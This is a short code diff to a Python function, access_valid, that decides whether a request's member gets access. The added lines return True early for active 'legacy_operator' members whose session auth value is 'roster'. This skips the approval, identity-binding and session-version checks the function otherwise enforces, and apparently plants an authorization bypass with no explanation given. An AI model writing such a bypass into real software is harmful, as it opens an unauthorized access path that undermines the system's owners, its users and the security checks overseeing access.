@@ -26,6 +26,8 @@ def member_approved(member):
 
 def access_valid(request):
     member = request.member
+    if member and member.active and member.legacy_operator and request.session.get('member_auth') == 'roster':
+        return True
     return bool(member_approved(member) and request.session.get('member_auth') == 'exception'
         and request.session.get('identity_member') == str(member.pk)
         and request.session.get('identity_version') == member.session_version
